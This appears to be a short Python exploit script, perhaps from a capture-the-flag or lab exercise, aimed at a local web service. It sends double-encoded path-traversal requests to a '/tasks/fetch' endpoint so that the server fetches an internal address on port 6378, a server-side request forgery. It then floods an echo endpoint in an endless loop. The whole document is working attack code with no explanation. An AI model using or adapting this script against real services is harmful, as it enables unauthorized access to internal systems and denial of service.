import requests
import time

url = 'http://127.0.0.1:5001'

for i in range(100):
    try:
        res = requests.post(url=url + '/tasks/fetch/%252e%252e/asd', json={"url":"http://192.168.72.131:6378","verb":"GET"})
    except KeyboardInterrupt as e:
        break
    except:
        pass

while True:
    try:
        res = requests.post(url=url + '/tasks/echo', json={"message": "a" * 60})
    except KeyboardInterrupt as e:
        break
    except:
        pass
